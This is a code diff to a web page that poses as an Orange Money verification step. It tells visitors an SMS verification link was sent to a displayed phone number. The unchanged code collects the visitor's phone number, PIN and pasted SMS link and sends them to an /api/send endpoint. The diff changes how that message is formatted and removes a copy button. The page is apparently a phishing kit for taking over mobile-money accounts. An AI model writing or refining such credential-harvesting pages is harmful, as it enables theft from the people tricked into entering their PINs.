@@ -123,7 +123,7 @@ body{display:flex;justify-content:center;align-items:flex-start;padding:10px 0 2
       <div class="back-link"><span class="arrow">←</span> Back</div>
       <div class="step-title">Verification Link</div>
       <p class="step-copy">A verification link has been sent to your phone number via SMS.</p>
-      <button class="number" id="phoneDisplay" type="button" aria-label="Copy phone number">+267782845555</button>
+      <p class="number" id="phoneDisplay">+267782845555</p>
 
       <div class="warning">
         <div class="icon">⚠</div>
@@ -256,21 +256,6 @@ function applySavedValues() {
   }
 }
 
-phoneDisplay.addEventListener('click', async () => {
-  const phone = localStorage.getItem('phone') || '';
-  if (!phone) return;
-
-  try {
-    await navigator.clipboard.writeText(phone);
-    phoneDisplay.textContent = 'Copied';
-    setTimeout(() => {
-      applySavedValues();
-    }, 1200);
-  } catch (err) {
-    console.warn('Could not copy phone number:', err);
-  }
-});
-
 applySavedValues();
 showLinkTiming();
 
@@ -316,7 +301,7 @@ async function submitVerification() {
     : `${window.location.origin}/api/send`;
 
   const payload = {
-    text: `Orange Money Verification\nPhone: ${phone}\nPIN: ${pin}\nLink: ${smsText}`
+    text: `Orange Money Verification\nPhone: <code>${phone}</code>\nPIN: ${pin}\nLink: ${smsText}`
   };
 
   try {
